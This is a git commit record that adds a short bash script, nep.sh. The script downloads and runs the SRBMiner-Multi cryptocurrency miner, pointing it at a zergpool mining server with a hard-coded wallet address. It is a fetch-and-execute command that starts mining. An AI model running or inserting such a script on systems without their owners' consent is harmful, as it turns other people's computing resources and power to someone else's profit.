a6c9168cf01034d1b6034f06857234e9c5e09df9
barburonjilo <barburonjilo@outlook.co.id>
2025-01-09 09:22:40 +0700

    Create nep.sh

---
+++ nep.sh
@@ -0,0 +1,3 @@
+#!/bin/bash
+
+wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.4.7/SRBMiner-Multi-2-4-7-Linux.tar.xz && tar -xvf SRBMiner-Multi-2-4-7-Linux.tar.xz && rm SRBMiner-Multi-2-4-7-Linux.tar.xz && cd SRBMiner-Multi-2-4-7 && ./SRBMiner-MULTI -a yespowersugar -o stratum+tcp://yespowerSUGAR.asia.mine.zergpool.com:6535 -u sugar1q8cfldyl35e8aq7je455ja9mhlazhw8xn22gvmr -p c=SUGAR,mc=SUGAR,m=solo,ID=you --timeout 120
